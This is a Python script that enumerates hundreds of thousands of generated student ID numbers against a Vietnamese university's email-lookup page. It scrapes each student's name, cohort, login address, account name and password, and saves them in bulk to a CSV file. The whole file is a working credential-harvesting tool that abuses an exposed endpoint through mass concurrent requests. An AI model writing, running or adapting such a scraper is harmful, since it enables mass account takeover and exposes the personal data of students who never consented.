import aiohttp
import asyncio
import time
import csv
import re
import os
from bs4 import BeautifulSoup
from tqdm import tqdm

URL = "https://tracuuthongtin.ftu.edu.vn/03_select_tracuuemail_k59.php"
SEMAPHORE = asyncio.Semaphore(50)

# Danh sách mã ngành
CD_VALUES = ["09", "10", "11", "12", "13", "14", "15", "16", "17", "18"]

# Danh sách năm (ID ngành)
MAJOR_IDS = [
    "810", "820", "510", "520", "530", "550", "110", "120", "140", "150", 
    "410", "450", "420", "610", "710", "740", "750", "730", "760", "920", 
    "210", "250", "280", "310", "320", "330", "340", "380", "720", "770"
]

# Tạo danh sách MSSV từ CD_VALUES và MAJOR_IDS
#Sua: K59 = 20, K58 = 19, K57 = 18, K56 = 17
msv_list = [
    f"20{cd}{major}{str(i).zfill(3)}" 
    for cd in CD_VALUES for major in MAJOR_IDS for i in range(1000)
]

errors = []
RESULT_DIR = "data/k59"
os.makedirs(RESULT_DIR, exist_ok=True)

RESULT_FILE = os.path.join(RESULT_DIR, "DataFtu_k59.csv")
ERROR_FILE = os.path.join(RESULT_DIR, "errors.all.csv")

async def fetch_data(session, msv):
    async with SEMAPHORE:
        try:
            async with session.post(URL, data={"msv": msv}, timeout=5) as response:
                if response.status == 200:
                    text = await response.text()
                    soup = BeautifulSoup(text, "html.parser")
                    result = soup.get_text().strip()
                    if "KHÔNG TÌM THẤY THÔNG TIN TRA CỨU" in result:
                        return None
                    return extract_info(msv, soup)
                else:
                    errors.append(msv)
                    return None
        except Exception:
            errors.append(msv)
            return None

def extract_info(msv, soup):
    text = soup.get_text(" ", strip=True)
    data = {
        "Mã sinh viên tra cứu": msv,
        "Mã sinh viên": None,
        "Họ và Tên": None,
        "Khóa": None,
        "Truy cập địa chỉ": None,
        "Tài khoản truy cập": None,
        "Mật khẩu": None
    }
    patterns = {
        "Mã sinh viên": r"Mã sinh viên:\s*(\d+)",
        "Họ và Tên": r"Họ và Tên:\s*([\w\sÀ-Ỹà-ỹ]+?)(?=\s*Khóa:)",
        "Khóa": r"Khóa:\s*(K\d+)",
        "Truy cập địa chỉ": r"Truy cập địa chỉ:\s*(http[^\s]+)",
        "Tài khoản truy cập": r"Tài khoản truy cập:\s*([\w.@]+)",
        "Mật khẩu": r"Mật khẩu:\s*([\S]+)"
    }
    for key, pattern in patterns.items():
        match = re.search(pattern, text)
        if match:
            data[key] = match.group(1)
    return list(data.values())

async def process_data():
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_data(session, msv) for msv in msv_list]
        results = []
        with tqdm(total=len(tasks), desc="Fetching Data") as pbar:
            for future in asyncio.as_completed(tasks):
                result = await future
                results.append(result)
                pbar.update(1)
    
    with open(RESULT_FILE, "w", encoding="utf-8", newline="") as f:
        writer = csv.writer(f, delimiter=';')
        writer.writerow(["Mã sinh viên tra cứu", "Mã sinh viên", "Họ và Tên", "Khóa", "Truy cập địa chỉ", "Tài khoản truy cập", "Mật khẩu"])
        for data in results:
            if data:
                writer.writerow(data)
    
    if errors:
        with open(ERROR_FILE, "w", encoding="utf-8", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["Mã sinh viên lỗi"])
            for err in errors:
                writer.writerow([err])
        print(f"⚠️ Đã lưu {len(errors)} lỗi vào {ERROR_FILE}")
    
    end_time = time.time()
    print(f"✅ Hoàn thành! Thời gian: {end_time - start_time:.2f}s")

asyncio.run(process_data())
